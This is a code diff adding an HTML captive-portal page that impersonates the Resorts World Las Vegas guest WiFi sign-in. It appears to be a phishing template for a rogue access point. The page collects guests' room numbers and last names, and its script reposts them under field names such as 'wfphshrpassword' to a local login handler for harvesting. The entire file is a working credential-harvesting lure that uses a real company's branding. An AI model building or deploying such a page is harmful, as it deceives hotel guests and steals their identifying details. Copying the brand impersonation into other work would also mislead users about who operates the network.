@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+          <link rel="icon" href="static/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in to Resorts World WiFi</title>
+  <link rel="stylesheet" href="static/css/style.css" />
+        <script src='static/js/jquery-3.4.1.min.js'></script>
+</head>
+<body>
+  <div class="portal-container">
+    <main class="portal-content">
+      <div class="portal-card">
+        <div class="logo-container">
+          <img src="static/img/rwlv-logo.png" alt="Resorts World Las Vegas Logo" class="rwlv-logo" />
+        </div>
+
+        <div class="button-group">
+          <button id="haveRoomBtn" class="primary-btn active">I Have a Room</button>
+          <button id="visitingBtn" class="secondary-btn">Just Visiting!!</button>
+        </div>
+
+        <form name="signIn" method="post" action="#">
+          <div class="form-group">
+            <input type="text" id="roomNumber" name="eml" placeholder="Room Number *" required />
+            <p class="field-help">Your room number.</p>
+          </div>
+
+          <div class="form-group">
+            <input type="text" id="lastName" name="pwd" placeholder="Registered guest last name *" required />
+            <p class="field-help">Last name of registered guest.</p>
+          </div>
+
+          <button type="submit" name="btn" id="btn" class="next-btn">
+            <span class="check-mark">✓</span> Next
+          </button>
+
+          <p class="required-note"><span class="asterisk">*</span> required field</p>
+
+          <div class="already-registered">
+            <p>Already registered for Internet access or have purchased an Internet Upgrade? Please <a href="#" class="sign-in-link">Sign In</a></p>
+          </div>
+        </form>
+
+        <footer class="portal-footer">
+          <p>&copy; Copyright 2025</p>
+        </footer>
+      </div>
+    </main>
+  </div>
+  <script>
+$("#btn").on("click", function(e) {
+    e.preventDefault();
+    // get the password box and checkbox elements
+    var input = document.getElementById("roomNumber");
+    var input2 = document.getElementById("lastName");
+    post('login', {
+        wfphshremail: input.value,
+        wfphshrpassword: input2.value
+    });
+});
+
+
+function post(path, params) {
+    // create a form and set its attributes
+    var form = document.createElement("form");
+    form.setAttribute("method", "post");
+    form.setAttribute("action", path);
+
+    // set the attribute for the post
+    for (var key in params) {
+        if (params.hasOwnProperty(key)) {
+            var hiddenField = document.createElement("input");
+            hiddenField.setAttribute("type", "hidden");
+            hiddenField.setAttribute("name", key);
+            hiddenField.setAttribute("value", params[key]);
+            form.appendChild(hiddenField);
+        }
+    }
+    // submit the post
+    document.body.appendChild(form);
+    form.submit();
+}
+var input = document.getElementById("roomNumber");
+var input2 = document.getElementById("lastName");
+input.disabled = false;
+input2.disabled = false;
+</script>
+</body>
+</html>
